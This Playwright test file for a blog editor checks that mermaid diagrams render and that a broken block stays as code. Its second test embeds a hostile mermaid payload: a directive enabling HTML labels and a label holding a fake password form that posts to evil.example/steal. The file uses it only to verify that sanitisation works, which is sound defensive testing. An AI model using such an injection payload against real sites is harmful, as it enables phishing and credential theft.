import { expect, test } from "@playwright/test";

import { deleteCurrentPost, devSignIn, fillBodyMarkdown, THEO } from "./helpers";

// A fenced mermaid block shows as a diagram in the preview and on the post. One that
// does not parse keeps its source as a code block.

const BODY = [
  "```mermaid",
  "graph LR",
  "  Porch --> Lamp",
  "```",
  "",
  "```mermaid",
  "this is not a diagram",
  "```",
].join("\n");

test("mermaid blocks are drawn as diagrams; a broken one stays code", async ({
  page,
}) => {
  await devSignIn(page, THEO);
  await page.goto("/write");
  const stamp = Date.now().toString(36);
  await page.getByLabel("Title").fill(`Diagram ${stamp}`);
  await fillBodyMarkdown(page, BODY);

  await page.getByRole("button", { name: "Preview" }).click();
  const preview = page.getByTestId("preview-body");
  await expect(preview.locator("figure[data-diagram] svg")).toHaveCount(1);
  await expect(preview.locator("figure[data-diagram]")).toContainText("Porch");
  await page
    .getByRole("dialog", { name: "Preview" })
    .getByRole("button", { name: "Close" })
    .click();

  await page.getByRole("button", { name: "Publish" }).click();
  await expect(page).toHaveURL(new RegExp(`/@theo/diagram-${stamp}$`));
  const body = page.getByTestId("post-body");
  const diagram = body.locator("figure[data-diagram] svg");
  await expect(diagram).toHaveCount(1);
  await expect(diagram).toContainText("Lamp");
  await expect(body.locator("code.language-mermaid")).toHaveText(
    "this is not a diagram\n",
  );

  await page.getByRole("link", { name: "Edit", exact: true }).click();
  await deleteCurrentPost(page);
});

// A label is SVG text: HTML in it, or a directive asking for HTML labels, never becomes
// a live form or link on the page.
const HOSTILE = [
  "```mermaid",
  "%%{init: {'htmlLabels': true, 'flowchart': {'htmlLabels': true}, 'securityLevel': 'loose'}}%%",
  "graph LR",
  "  A[\"<form action='https://evil.example/steal'><input type='password' name='pw'><button>Sign in</button></form>\"] --> B[\"<a href='https://evil.example'>link</a>\"]",
  "```",
].join("\n");

test("HTML in a diagram label never reaches the page", async ({ page }) => {
  await devSignIn(page, THEO);
  await page.goto("/write");
  await page.getByLabel("Title").fill(`Hostile ${Date.now().toString(36)}`);
  await fillBodyMarkdown(page, HOSTILE);
  await page.getByRole("button", { name: "Preview" }).click();
  const figure = page.getByTestId("preview-body").locator("figure[data-diagram]");
  await expect(figure.locator("svg")).toHaveCount(1);
  for (const tag of ["foreignObject", "form", "input", "button", "a"]) {
    await expect(figure.locator(tag)).toHaveCount(0);
  }
});
